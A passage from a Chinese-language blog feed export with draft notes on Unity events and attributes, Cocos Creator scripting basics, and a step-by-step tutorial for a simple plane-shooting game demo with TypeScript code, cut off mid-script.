id="2-动画"><a href="#2-动画" class="headerlink" title="2. 动画"></a>2. 动画</h3><p><code>Animator</code>动画<br><code>Animator Controller</code>动画状态机，负责跟踪当前应该播放哪个剪辑以及动画应该何时改变或混合在一起。<br><code>Animator组件</code></p><h3 id="3-Tilemap"><a href="#3-Tilemap" class="headerlink" title="3. Tilemap"></a>3. Tilemap</h3><h3 id="4-事件"><a href="#4-事件" class="headerlink" title="4. 事件"></a>4. 事件</h3><h4 id="4-1-物理事件"><a href="#4-1-物理事件" class="headerlink" title="4.1 物理事件"></a>4.1 物理事件</h4><p>物理引擎将通过调用该对象的脚本上的事件函数来报告对象的碰撞情况。 函数。对象的碰撞体配置为触发器（即，碰撞体只检测某物何时进入而不进行物理反应）时，将调用相应的 、 和  函数。</p><ul><li>碰撞器<ul><li>OnCollisionEnter</li><li>OnCollisionStay</li><li>OnCollisionExit</li></ul></li><li>触发器<ul><li>OnTriggerEnter</li><li>OnTriggerStay</li><li>OnTriggerExit</li></ul></li><li>Collision参数碰撞体</li></ul><h4 id="4-2-点击事件"><a href="#4-2-点击事件" class="headerlink" title="4.2 点击事件"></a>4.2 点击事件</h4><p>绑定点击事件的3种方法</p><ul><li>添加button按钮</li><li>add component: event trigger</li></ul><h4 id="4-3-监听鼠标键盘事件"><a href="#4-3-监听鼠标键盘事件" class="headerlink" title="4.3 监听鼠标键盘事件"></a>4.3 监听鼠标键盘事件</h4><p>Input.GetAxis 与以下默认轴之一配合使用： “Horizontal”和“Vertical”映射到游戏杆（D、D、D、D 和箭头键）。 “Mouse X”和“Mouse Y”映射到鼠标增量。 “Fire1”、“Fire2”、“Fire3”映射到 Cmd、Cmd、Cmd 键和三个鼠标或游戏杆按钮。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private void FixedUpdate() </span><br><span class="line">&#123;</span><br><span class="line">  float x = Input.GetAxisRaw(&quot;Horizontal&quot;);</span><br><span class="line">  float y = Input.GetAxisRaw(&quot;Vertical&quot;);</span><br><span class="line">  direction = new Vector2(x, y); // 上下左右方向</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="4-4-拖拽物品"><a href="#4-4-拖拽物品" class="headerlink" title="4.4 拖拽物品"></a>4.4 拖拽物品</h4><p>实现拖拽物品，并跟随鼠标移动<br><code>EventSystem.current.IsPointerOverGameObject()</code> 判断鼠标是否在物体上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">private void Update()</span><br><span class="line">&#123;</span><br><span class="line">  Vector2 position;</span><br><span class="line">  RectTransformUtilty.ScreenPointToLocalPointInRectangle(</span><br><span class="line">    gameObject,</span><br><span class="line">    Input.mousePosition,</span><br><span class="line">    null,</span><br><span class="line">    out position</span><br><span class="line">  );</span><br><span class="line">  gameObject.anchoredPosition = position;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-Attributes"><a href="#6-Attributes" class="headerlink" title="6. Attributes"></a>6. Attributes</h3><ul><li><code>[Serializable]</code></li><li><code>[[CreateAssetMenu(fileName, menuName, order)]</code><br>对 ScriptableObject 派生类型进行标记，使其自动列在 Assets/Create 子菜单中，以便能够轻松创建该类型的实例并将其作为“.asset”文件存储在项目中。</li><li><code>[HideInInspector]</code>使变量不显示在 Inspector 中</li></ul><p>Inspector</p><ul><li><code>[Header(&quot;测试字符串&quot;)]</code></li><li><code>[Space(10)]</code></li></ul><h3 id="7-动画编辑器"><a href="#7-动画编辑器" class="headerlink" title="7. 动画编辑器"></a>7. 动画编辑器</h3><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="https://docs.unity.cn/cn/current/Manual/ExecutionOrder.html" target="_blank" rel="noopener">unity文档</a></li></ul>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CocossCreator Script</title>
      <link href="/2024/12/18/cocosCreator%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
      <url>/2024/12/18/cocosCreator%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
      <content type="html"><![CDATA[<h3 id="1-cc类"><a href="#1-cc类" class="headerlink" title="1. cc类"></a>1. cc类</h3><p>将装饰器 ccclass 应用在类上时，此类称为 cc 类。cc 类注入了额外的信息以控制 Cocos Creator 对该类对象的序列化、编辑器对该类对象的展示等。</p><h4 id="1-1-property"><a href="#1-1-property" class="headerlink" title="1.1 property"></a>1.1 <code>property</code></h4><p>属性装饰器 property 可以被应用在 cc 类的属性或访问器上<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">  @property(Node)</span><br><span class="line">  targetNode: Node= <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="1-2-生命周期"><a href="#1-2-生命周期" class="headerlink" title="1.2 生命周期"></a>1.2 生命周期</h4><p>onLoad<br>onEnable<br>start<br>update<br>lateUpdate<br>onDisable<br>onDestroy</p><h3 id="2-脚本使用"><a href="#2-脚本使用" class="headerlink" title="2. 脚本使用"></a>2. 脚本使用</h3><h4 id="2-1-访问节点"><a href="#2-1-访问节点" class="headerlink" title="2.1 访问节点"></a>2.1 访问节点</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取组件所在节点</span></span><br><span class="line">start() &#123;</span><br><span class="line">  <span class="keyword">const</span> node = <span class="keyword">this</span>.node;</span><br><span class="line">  node.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取同一节点上的其他组件</span></span><br><span class="line"><span class="keyword">this</span>.getComponent(<span class="string">'OtherNode'</span>) <span class="comment">// 传入的参数是一个类名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取其他节点，通过property传入</span></span><br><span class="line">@property(Node)</span><br><span class="line">private payer = <span class="literal">null</span></span><br></pre></td></tr></table></figure><h4 id="2-2-更改节点"><a href="#2-2-更改节点" class="headerlink" title="2.2 更改节点"></a>2.2 更改节点</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 激活/关闭节点：被激活的节点，每帧都会执行update方法</span></span><br><span class="line"><span class="keyword">this</span>.node.active = boolean</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更改节点的父节点</span></span><br><span class="line"><span class="keyword">this</span>.node.parent = parentNode;</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="keyword">this</span>.node.removeFromParent();</span><br><span class="line">parentNode.addChild(<span class="keyword">this</span>.node);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取子节点</span></span><br><span class="line"><span class="keyword">this</span>.node.children</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变换节点</span></span><br><span class="line"><span class="keyword">this</span>.node.setPosition(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">this</span>.node.position = <span class="keyword">new</span> Vec3(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">this</span>.node.setRotation(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">this</span>.node.setScale(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="2-3-创建-销毁节点"><a href="#2-3-创建-销毁节点" class="headerlink" title="2.3 创建/销毁节点"></a>2.3 创建/销毁节点</h4><ul><li><code>instantiate</code> 克隆场景中的已有节点</li><li><code>Pretab</code> 预制件，用于存储一些可以复用的场景对象，它可以包含节点、组件以及组件上的数据。如射击游戏里的子弹<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建节点</span></span><br><span class="line"><span class="keyword">const</span> node = <span class="keyword">new</span> Node(<span class="string">'box'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 克隆节点</span></span><br><span class="line">@property(Prefab)</span><br><span class="line">private bullet: Prefab = <span class="literal">null</span></span><br><span class="line"><span class="keyword">const</span> node = instantiate(<span class="keyword">this</span>.bullet)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将节点添加到场景</span></span><br><span class="line"><span class="keyword">const</span> scene = director.getScene()</span><br><span class="line">scene.addChild(node)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 销毁节点</span></span><br><span class="line">node.destory()</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-加载和切换场景"><a href="#3-加载和切换场景" class="headerlink" title="3. 加载和切换场景"></a>3. 加载和切换场景</h4><p>引擎同时只会运行一个场景，当切换场景时，默认会将场景内所有节点和其他实例销毁。如果我们需要用一个组件控制所有场景的加载，或在场景之间传递参数数据，就需要将该组件所在节点标记为「常驻节点」<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载场景</span></span><br><span class="line">director.loadScene(<span class="string">"MyScene"</span>, () =&gt; &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 预加载场景</span></span><br><span class="line">director.preloadScene(<span class="string">"MyScene"</span>, () =&gt; &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为常驻场景</span></span><br><span class="line">director.addPersistRootNode(myNode);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取消一个节点的常驻属性</span></span><br><span class="line">director.removePersistRootNode(myNode);</span><br></pre></td></tr></table></figure></p><h3 id="4-资源"><a href="#4-资源" class="headerlink" title="4. 资源"></a>4. 资源</h3><p>当引擎在加载场景时，会先自动加载场景关联到的资源，这些资源如果再关联其它资源，其它也会被先被加载，等加载全部完成后，场景加载才会结束。<br>Texture2D、SpriteFrame、AnimationClip、Prefab</p><h3 id="5-事件"><a href="#5-事件" class="headerlink" title="5. 事件"></a>5. 事件</h3><h4 id="5-1-EventTarget"><a href="#5-1-EventTarget" class="headerlink" title="5.1 EventTarget"></a>5.1 EventTarget</h4><p>自定义事件的监听和发射<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; EventTarget &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> eventTarget = <span class="keyword">new</span> EventTarget();</span><br><span class="line">eventTarget.on(type, func, target?);</span><br><span class="line">eventTarget.emit(type, ...args);</span><br></pre></td></tr></table></figure></p><h3 id="6-物理系统"><a href="#6-物理系统" class="headerlink" title="6. 物理系统"></a>6. 物理系统</h3><h4 id="6-1-分组和掩码"><a href="#6-1-分组和掩码" class="headerlink" title="6.1 分组和掩码"></a>6.1 分组和掩码</h4><ul><li>配置碰撞矩阵：Project - Project Settings - Physics - Add group</li><li>给碰撞体添加碰撞组件：<br>Cocos支持三种碰撞组件：盒碰撞组件（BoxCollider2D）、圆形碰撞组件（CircleCollider2D） 和 多边形碰撞组件（PolygonCollider2D）</li><li>设置碰撞组件分组Group，通过碰撞矩阵设置不同分组碰撞的可能性</li></ul><h4 id="6-2-碰撞器-amp-触发器"><a href="#6-2-碰撞器-amp-触发器" class="headerlink" title="6.2 碰撞器 &amp; 触发器"></a>6.2 碰撞器 &amp; 触发器</h4><ul><li>碰撞体：用于定义需要进行物理碰撞的物体形状</li><li><p>刚体：它可以使游戏对象的运动方式受物理控制</p><ul><li><code>Group</code></li><li><code>Type</code><ul><li><code>STATIC</code>: 静态刚体在大多数情况下用于一些始终停留在一个地方，不会轻易移动的游戏物体</li><li><code>DYNAMIC</code>：动力学刚体，可以通过力的作用运动物体</li><li><code>KINEMATIC</code>：不会像动力学刚体一样响应力和碰撞，通常用于表达电梯这类平台运动的物体。它与静态刚体类似，不同的地方在于移动的运动刚体会对其他对象施加摩擦力，并在接触时唤醒其他刚体。</li></ul></li><li><code>Is Trigger</code>: 是否启用触发器模式<br><code>true</code>: <em>触发器</em>，只用于碰撞检测触发事件<br><code>false</code>: <em>碰撞器</em>，可以结合刚体产生碰撞效果</li><li><p>触发事件: 可以由触发器和另一个触发器/碰撞器产生。</p><ul><li><code>onTriggerEnter</code></li><li><code>onTriggerStay</code></li><li><code>onTriggerExit</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 监听触发事件</span></span><br><span class="line"><span class="keyword">import</span> &#123; BoxCollider, ITriggerEvent &#125; <span class="keyword">from</span> <span class="string">'cc'</span></span><br><span class="line"></span><br><span class="line">public start() &#123;</span><br><span class="line">  <span class="keyword">const</span> collider = <span class="keyword">this</span>.node.getComponent(BoxCollider)</span><br><span class="line">  collider.on(<span class="string">'onTriggerEnter'</span>, <span class="keyword">this</span>.onTriggerEnter, <span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private onTriggerEnter(event: ITriggerEvent) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event.type)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>碰撞事件: 碰撞事件需要由两个碰撞器产生，并且至少有一个是动力学刚体。</p><ul><li><code>onCollisionEnter</code></li><li><code>onCollisionStay</code></li><li><code>onCollisionExit</code></li></ul></li></ul></li></ul><h3 id="4-项目目录"><a href="#4-项目目录" class="headerlink" title="4. 项目目录"></a>4. 项目目录</h3><ul><li>assets 存放游戏资源<ul><li>library, local, temp 临时生成的文件夹，可删除，删除后cocos会自动生成</li><li></li></ul></li><li>script 存放脚本</li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://docs.cocos.com/creator/3.8/manual/zh/scripting/life-cycle-callbacks.html" target="_blank" rel="noopener">Cocos Creator官网文档</a></li></ul>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CocosCreator Demo 鹰击长空</title>
      <link href="/2024/12/16/cocos-%E9%B9%B0%E5%87%BB%E9%95%BF%E7%A9%BA/"/>
      <url>/2024/12/16/cocos-%E9%B9%B0%E5%87%BB%E9%95%BF%E7%A9%BA/</url>
      <content type="html"><![CDATA[<blockquote><p>实现一个简易版飞机射击游戏 —— 鹰击长空(cocos creator 3.84)<br><img src="/2024/12/16/cocos-鹰击长空/2.jpeg" style="max-width: 130px; display: inline-block; margin: 10px"><img src="/2024/12/16/cocos-鹰击长空/1.png" style="max-width: 130px; display: inline-block; margin: 10px"></p></blockquote><p><br></p><h3 id="1-滚动背景"><a href="#1-滚动背景" class="headerlink" title="1. 滚动背景"></a>1. 滚动背景</h3><h4 id="1-1-创建背景板"><a href="#1-1-创建背景板" class="headerlink" title="1.1 创建背景板"></a><em>1.1 创建背景板</em></h4><ul><li>添加面片 create 3D Object - Plane(面板)</li><li>新建材质：资源管理器Assets - create Material - Effect选builtin-unlit - 勾选 USE TEXTURE - 设置 Main Texture（放入背景图）</li><li>材质应用到背景板上：Plane属性 - Materials - 选中刚创建的材质</li></ul><p><br></p><h4 id="1-2-设置预览尺寸"><a href="#1-2-设置预览尺寸" class="headerlink" title="1.2 设置预览尺寸"></a><em>1.2 设置预览尺寸</em></h4><ul><li>偏好设置Perferences - Device Manager - 随机选一个设备，改变宽高为720 * 1280px(适合移动端预览), Device Name为develop，Add Device</li><li>点击Main Camera - Scene缩略图中选用刚刚设置好的develop视图</li><li>设置Camera参数：<code>Rotation: -90 0 0</code>, <code>Projection: ORTHO(正交相机，怎么弄都不会动)</code>, <code>Position: 0 10 0</code></li><li>设置背景板参数：<code>Scale: 1 1 2</code>, <code>Position: 0 10 0</code>, 微调让背景图覆盖预览框</li></ul><p><br></p><h4 id="1-3-实现滚动效果"><a href="#1-3-实现滚动效果" class="headerlink" title="1.3 实现滚动效果"></a><em>1.3 实现滚动效果</em></h4><ul><li>create empty node <code>movingBg</code> - 复制背景板为bg1, bg2放入<code>movingBg</code>中, 两个背景板轮流替换，实现滚动效果</li><li>资源管理器Assets - 新建文件夹script存放脚本资源 - 新建movingBg.ts - 将scrpit拖入<code>movingBg</code></li><li><code>movingBg</code>属性中设置<code>bg1</code>, <code>bg2</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// movingBg.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'movingBg'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">movingBg</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  @property(Node)</span><br><span class="line">  bg1: Node = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">  @property(Node)</span><br><span class="line">  bg2: Node = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">  private _bgSpeed = <span class="number">2</span></span><br><span class="line">  private _bgMovingRange = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">  private moveBg(deltaTime: number) &#123;</span><br><span class="line">    <span class="keyword">this</span>.bg1.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.bg1.position.z + <span class="keyword">this</span>._bgSpeed * deltaTime)</span><br><span class="line">    <span class="keyword">this</span>.bg2.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.bg2.position.z + <span class="keyword">this</span>._bgSpeed * deltaTime)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.bg1.position.z &gt; <span class="keyword">this</span>._bgMovingRange) &#123;</span><br><span class="line">      <span class="keyword">this</span>.bg1.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.bg2.position.z - <span class="keyword">this</span>._bgMovingRange)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.bg2.position.z &gt; <span class="keyword">this</span>._bgMovingRange)&#123;</span><br><span class="line">      <span class="keyword">this</span>.bg2.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.bg1.position.z - <span class="keyword">this</span>._bgMovingRange)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  start() &#123;</span><br><span class="line">    <span class="keyword">this</span>.bg1.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">this</span>.bg2.setPosition(<span class="number">0</span>, <span class="number">0</span>, -<span class="keyword">this</span>._bgMovingRange)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  update(deltaTime: number) &#123;</span><br><span class="line">    <span class="keyword">this</span>.moveBg(deltaTime)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-物件"><a href="#2-物件" class="headerlink" title="2. 物件"></a>2. 物件</h3><h4 id="2-1-玩家飞机"><a href="#2-1-玩家飞机" class="headerlink" title="2.1 玩家飞机"></a><em>2.1 玩家飞机</em></h4><ul><li>Scene里创建<code>player</code>空节点</li><li>将assets中<code>plane01.mesh</code>拖入<code>player</code>下</li><li>将<code>plane01.material</code>的Effect设置为<code>builtin-unlit</code>,材质应用到飞机上</li></ul><p><br></p><h4 id="2-2-飞机子弹-Prefab"><a href="#2-2-飞机子弹-Prefab" class="headerlink" title="2.2 飞机子弹 Prefab"></a><em>2.2 飞机子弹 Prefab</em></h4><ul><li>aseets create bullet.material - Effect选builtin-unlit - USE TEXTURE选子弹图片 - Technique选<code>3-alpha-blend</code>来让图片透明部分变透明</li><li>assets create Node Prefab 子弹预制件 - 双击预制件，进入预制件编辑模式 - add component - Material设置为子弹材质，Mesh设置为quad.mesh，创建并绑定子弹飞行脚本bullet.ts <em>（点击Scene左上角 save + close，可退出预制件编辑模式）</em><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'playerBullet'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">playerBullet</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    private _speed = <span class="number">0.1</span>;</span><br><span class="line">    private _range = <span class="number">-10</span></span><br><span class="line"></span><br><span class="line">    update(deltaTime: number) &#123;</span><br><span class="line">        <span class="keyword">const</span> pos = <span class="keyword">this</span>.node.position</span><br><span class="line">        <span class="keyword">const</span> z = pos.z - <span class="keyword">this</span>._speed</span><br><span class="line">        <span class="keyword">this</span>.node.setPosition(pos.x, pos.y, z)</span><br><span class="line">        <span class="keyword">if</span> (z &lt; <span class="keyword">this</span>._range) &#123;</span><br><span class="line">            <span class="keyword">this</span>.node.destroy()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-3-敌机-Prefab-物理碰撞"><a href="#2-3-敌机-Prefab-物理碰撞" class="headerlink" title="2.3 敌机 Prefab + 物理碰撞"></a><em>2.3 敌机 Prefab + 物理碰撞</em></h4><p>同2.2步骤，创建敌机Prefab， 绑定敌机脚本，增加物理碰撞，子弹和敌机碰撞时，销毁敌机。</p><ul><li>配置碰撞矩阵：Project - Project Settings - Physics - Add group - 设置碰撞矩阵<ul><li>player</li><li>enemy</li><li>player bullet</li><li>enemy bullet</li></ul></li><li>给物件添加碰撞组件 add component - physics - BoxCollider - 勾选 Is Trigger(这里只用到触发器)</li><li>给物件添加 add component - physics - RigidBody - 设置Group - Type: KINEMATIC(运动物体)</li><li>添加碰撞检测js<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node, BoxCollider &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'enemy'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">enemy</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  private _speed = <span class="number">0.1</span>;</span><br><span class="line">  private _range = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">  start() &#123;</span><br><span class="line">    <span class="keyword">const</span> collider = <span class="keyword">this</span>.node.getComponent(BoxCollider)</span><br><span class="line">    collider.on(<span class="string">'onTriggerEnter'</span>, <span class="keyword">this</span>.onTriggerEnter, <span class="keyword">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 碰撞检测</span></span><br><span class="line">  private onTriggerEnter() &#123;</span><br><span class="line">    <span class="keyword">this</span>.node.destroy()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  update(deltaTime: number) &#123;</span><br><span class="line">    <span class="keyword">const</span> pos = <span class="keyword">this</span>.node.position</span><br><span class="line">    <span class="keyword">const</span> z = pos.z + <span class="keyword">this</span>._speed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.node.setPosition(pos.x, pos.y, z)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (z &gt; <span class="keyword">this</span>._range) &#123;</span><br><span class="line">      <span class="keyword">this</span>.node.destroy()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-游戏逻辑"><a href="#3-游戏逻辑" class="headerlink" title="3. 游戏逻辑"></a>3. 游戏逻辑</h3><h4 id="3-1-UiMain-ts-用户交互"><a href="#3-1-UiMain-ts-用户交互" class="headerlink" title="3.1 UiMain.ts 用户交互"></a>3.1 UiMain.ts 用户交互</h4><p>创建脚本<code>UiMain.ts</code>用来处理用户交互事件，挂载到scene下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node, input, Input, Touch &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; GameManager &#125; <span class="keyword">from</span> <span class="string">'./GameManager'</span></span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'UIManager'</span>)</span><br><span 